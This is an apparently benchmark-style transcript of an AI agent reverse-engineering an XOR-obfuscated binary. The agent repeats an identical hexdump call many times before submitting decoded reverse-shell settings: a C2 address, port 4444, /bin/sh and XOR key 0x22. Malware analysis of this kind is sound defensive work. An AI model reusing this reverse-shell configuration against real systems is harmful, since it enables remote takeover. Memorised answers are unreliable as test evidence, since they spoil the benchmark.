+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5914,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 64
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHQqG+sgbHB4UIpmrLUmz1FiW9yB3A274Hj5+VXJls0W+g4YDzJDDu0AR/wF8s"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "0000171a  55 48 89 e5 48 83 ec 30  48 b8 13 1b 10 0c 13 14  |UH..H..0H.......|\n0000172a  1a 0c 48 89 45 ee 48 b8  1a 0c 13 0c 13 12 12 00  |..H.E.H.........|\n0000173a  48 89 45 f4 c7 45 e9 16  16 16 16 c6 45 ed 00 48  |H.E..E......E..H|\n0000174a  b8 0d 40 4b 4c 0d 51 4a  00 48 89 45 e1 48 8d 45  |..@KL.QJ.H.E.H.E|\n0000175a\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5914,
+          "length": 128,
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHzM2o/e1LCj/Ycg/3xkKKPkoPeNSnCdGsByzVWjnn3dlYyg/LAy0wwbHroypF"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "0000171a  55 48 89 e5 48 83 ec 30  48 b8 13 1b 10 0c 13 14  |UH..H..0H.......|\n0000172a  1a 0c 48 89 45 ee 48 b8  1a 0c 13 0c 13 12 12 00  |..H.E.H.........|\n0000173a  48 89 45 f4 c7 45 e9 16  16 16 16 c6 45 ed 00 48  |H.E..E......E..H|\n0000174a  b8 0d 40 4b 4c 0d 51 4a  00 48 89 45 e1 48 8d 45  |..@KL.QJ.H.E.H.E|\n0000175a  ee be 22 00 00 00 48 89  c7 e8 7d ff ff ff 48 8d  |..\"...H...}...H.|\n0000176a  45 e9 be 22 00 00 00 48  89 c7 e8 6c ff ff ff 48  |E..\"...H...l...H|\n0000177a  8d 45 e1 be 22 00 00 00  48 89 c7 e8 5b ff ff ff  |.E..\"...H...[...|\n0000178a  ba 00 00 00 00 be 01 00  00 00 bf 02 00 00 00 e8  |................|\n0000179a\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 128,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "offset": 5914
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH4z96GiykOhOV+SGEJYIKBN6L0mzdAe2gcpk09jH7cILOwxesVyRSHuoaH+VM"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "0000171a  55 48 89 e5 48 83 ec 30  48 b8 13 1b 10 0c 13 14  |UH..H..0H.......|\n0000172a  1a 0c 48 89 45 ee 48 b8  1a 0c 13 0c 13 12 12 00  |..H.E.H.........|\n0000173a  48 89 45 f4 c7 45 e9 16  16 16 16 c6 45 ed 00 48  |H.E..E......E..H|\n0000174a  b8 0d 40 4b 4c 0d 51 4a  00 48 89 45 e1 48 8d 45  |..@KL.QJ.H.E.H.E|\n0000175a  ee be 22 00 00 00 48 89  c7 e8 7d ff ff ff 48 8d  |..\"...H...}...H.|\n0000176a  45 e9 be 22 00 00 00 48  89 c7 e8 6c ff ff ff 48  |E..\"...H...l...H|\n0000177a  8d 45 e1 be 22 00 00 00  48 89 c7 e8 5b ff ff ff  |.E..\"...H...[...|\n0000178a  ba 00 00 00 00 be 01 00  00 00 bf 02 00 00 00 e8  |................|\n0000179a\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings",
+          "offset": 5922,
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHt1ie0EKZDzZbiVhuuEqQ/6Ylv0U/dMfqeTzdRoRdcoZQptbU2PgRsjSMoEbo"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 48,
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHAsuTYLVof/p81V/DSvniqalkHhENbUX62NgBj570yLC70yn0efXCrYHw5+cn"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings",
+          "offset": 5922,
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHUJq8TyKXIpr6nsw3ILnUu6R4XT6uQrwDE1sAjUCAP2n57CyCmHnaoOB7/0TS"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 48,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "offset": 5922
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHllRqvU/yBNBVHKiL+0ui7a34BpCJ8yVq1/pqP1XApRL40eGdi8QNjVySaVcc"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHFYQTDkTWhZAoCPGj3vNChBSAJ+uLi5CauAy+7KiVzxIRdViO/H8zkW//KNMe"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 48,
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHx+gMXRxGDmTur8c7D5JA/rlKQEqS0H9UtWmRNqSM8Von9vWRfVM3i7MQK+VO"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5922,
+          "length": 48,
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH6+2bppdF5uiUV9+6kRQWIRBH25xfDaHet3EC+0z9daWUpc4EFHDI975WWkn+"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48,
+          "offset": 5922
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHVPEoty8h6ZN+DNJf+JPZ56iKLZkRTW3yC/oHBc2gp27rmBl15boQmNvPjIIX"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 48,
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH0puWK0HA6Jbh5cMns2uJTsipCkewiGsiVWWlgAPWY+6tvvgBVQz1mCxpJ3j0"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 48,
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHZmRZpHblLn5QqXf/Kx5+u2fqzVNwl9FYo5fRIcc9+aGdsofZCyWUgTI1PsRf"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH2hm22fHrViDYlDNFT69hWklCFLh+QYw7vFuYzb63iryMl1P4acTNduqhoPhu"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5922,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH+p1QsOX/etxhotWlY8OduC3s82HJKSilGFVCy4s7PmHOeLxXmCMM9mEn44k5"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "length": 48,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "offset": 5922
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHHT9zGAsQFifD389CKjfALGvWZP4R4Nu5adirFImmV/GVuYlGGJm3vPq01w8+"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48,
+          "offset": 5922
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH7WJ+Pa0LbPiQx28wu9nOgz7c7LAFtAy3MkGvlQHLPxZgMegEvFTo3xADVedl"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": "IMPORTANT: You have only 5 tool calls remaining. Start wrapping up your analysis and submit your findings using the final_answer tool soon. Submit your best answer with what you've found so far rather than running out of tool calls."
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48,
+          "offset": 5922
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHxxLdfJSw65+1IQ25dbCm3t5G6zAYCt+1mJP1LX2mtYyC+sfZf3JPD9bzoqTJ"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001722  48 b8 13 1b 10 0c 13 14  1a 0c 48 89 45 ee 48 b8  |H.........H.E.H.|\n00001732  1a 0c 13 0c 13 12 12 00  48 89 45 f4 c7 45 e9 16  |........H.E..E..|\n00001742  16 16 16 c6 45 ed 00 48  b8 0d 40 4b 4c 0d 51 4a  |....E..H..@KL.QJ|\n00001752\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5970,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbH6r4rEnel/4aacZcoYd3J08beMeT0FTyhLxSaWE1ekNFF/29etsaFclBtXu0+"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001752  00 48 89 45 e1 48 8d 45  ee be 22 00 00 00 48 89  |.H.E.H.E..\"...H.|\n00001762  c7 e8 7d ff ff ff 48 8d  45 e9 be 22 00 00 00 48  |..}...H.E..\"...H|\n00001772  89 c7 e8 6c ff ff ff 48  8d 45 e1 be 22 00 00 00  |...l...H.E..\"...|\n00001782\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_hexdump_0",
+        "name": "hexdump",
+        "input": {
+          "offset": 5970,
+          "path": "/workspace/level2_XorEncodedStrings",
+          "length": 48
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHdtKiORrU1MSmik2IPhne0rbBjmpVLSGjrkkr665ejz5SdIKI6VAq2yye8who"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_hexdump_0",
+        "content": "00001752  00 48 89 45 e1 48 8d 45  ee be 22 00 00 00 48 89  |.H.E.H.E..\"...H.|\n00001762  c7 e8 7d ff ff ff 48 8d  45 e9 be 22 00 00 00 48  |..}...H.E..\"...H|\n00001772  89 c7 e8 6c ff ff ff 48  8d 45 e1 be 22 00 00 00  |...l...H.E..\"...|\n00001782\n"
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": "CRITICAL: You have only 2 tool calls left. You MUST call the final_answer tool NOW with your best analysis. Do not use any more investigation tools."
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_final_answer_0",
+        "name": "final_answer",
+        "input": {
+          "c2_protocol": "TCP",
+          "decoded_strings": {
+            "address": "192.168.1.100",
+            "command": "/bin/sh",
+            "port": "4444"
+          },
+          "encryption_details": {
+            "key": "0x22",
+            "algorithm": "XOR"
+          },
+          "encoded_strings": true,
+          "techniques": [
+            "xor_encoding",
+            "socket_connect",
+            "execve",
+            "dup2_redirection"
+          ],
+          "file_type": "ELF64",
+          "decoded_c2": "192.168.1.100:4444"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHrfeE2Wnd/6gZkuVVRfIyFbAAJ6CEg5iY3Y46kAJI8T4ORp3dSTRNMYDfM9zw"
+        }
+      }
+    ]
+  }
+]
